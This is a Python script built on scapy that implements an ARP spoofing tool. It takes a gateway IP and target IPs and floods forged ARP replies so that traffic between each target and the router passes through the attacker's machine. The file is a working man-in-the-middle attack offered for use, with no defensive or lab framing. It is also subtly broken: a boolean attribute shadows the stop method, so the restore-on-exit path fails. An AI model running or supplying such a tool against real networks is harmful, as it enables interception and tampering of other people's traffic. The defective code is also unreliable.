from scapy.all import ARP, Ether, sendp, srp
import time
import threading

class ArpSpoofer:
    def __init__(self, target_ips, gateway_ip, interface):
        self.target_ips = target_ips  # List of victim IPs to spoof
        self.gateway_ip = gateway_ip  # Gateway (router) IP address
        self.interface = interface    # Network interface (e.g., 'eth0')
        self.stop_spoofing = False

    def get_mac(self, ip):
        """
        Retrieves the MAC address for the given IP address.
        """
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=3, iface=self.interface, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def spoof(self, target_ip, spoof_ip):
        """
        Sends ARP spoof packets to the target, telling it that we are the gateway.
        """
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            print(f"[!] Could not find MAC for {target_ip}")
            return
        
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(Ether(dst=target_mac) / arp_response, iface=self.interface, verbose=False)
        print(f"[+] Sent ARP spoof packet to {target_ip}: {spoof_ip} is-at {self.get_mac(spoof_ip)}")

    def restore(self, target_ip, spoof_ip):
        """
        Restores the original ARP mapping by sending correct ARP response.
        """
        target_mac = self.get_mac(target_ip)
        spoof_mac = self.get_mac(spoof_ip)
        if target_mac and spoof_mac:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            sendp(Ether(dst=target_mac) / arp_response, iface=self.interface, verbose=False)
            print(f"[+] Restored ARP for {target_ip}: {spoof_ip} is-at {spoof_mac}")

    def start_spoofing(self):
        """
        Start ARP spoofing all target IPs.
        """
        while not self.stop_spoofing:
            for target_ip in self.target_ips:
                self.spoof(target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, target_ip)
            time.sleep(1)

    def stop_spoofing(self):
        """
        Stop ARP spoofing and restore ARP tables.
        """
        self.stop_spoofing = True
        for target_ip in self.target_ips:
            self.restore(target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, target_ip)
        print("[+] Stopped spoofing and restored ARP tables.")

    def run(self):
        spoof_thread = threading.Thread(target=self.start_spoofing)
        spoof_thread.start()
        try:
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_spoofing()
            spoof_thread.join()

if __name__ == "__main__":
    gateway_ip = input("Enter the gateway : ") 
    target_ips = input("Enter the target ip's: ")

    # Split the input string into a list of strings
    target_ips = target_ips.split()

    print(target_ips)
    interface = "wlan0"  # Replace with your network interface
    
    spoofer = ArpSpoofer(target_ips, gateway_ip, interface)
    spoofer.run()
